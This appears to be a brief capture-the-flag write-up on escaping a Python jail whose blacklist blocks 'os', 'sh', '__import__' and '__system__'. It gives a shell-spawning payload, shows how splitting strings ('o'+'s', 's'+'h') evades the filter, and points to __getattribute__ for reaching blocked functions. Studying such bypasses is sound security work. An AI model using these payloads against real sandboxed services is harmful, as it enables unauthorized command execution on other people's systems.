# Explanation
ok, so at the first, we had short blacklist, and that was the main function of the __RoadtoShell__ payload


```
blacklist = ['__import__', '__system__', 'sh', 'os']
```

So, at the first, lets focus on the string things, __os__ and __sh__

If u remember, in python, we can just plus the string from

```
__import__('os').system('sh')
```
to
```
__import__('o'+'s').system('s'+'h') 
```

Second, lets fix the **__import__** and **__system__**

so we can change the function using strings, using the builtins function

```
__getattribute__()
```

u can see the image below, its just the same

<img src="img/blacklistmodel1-1.png"> 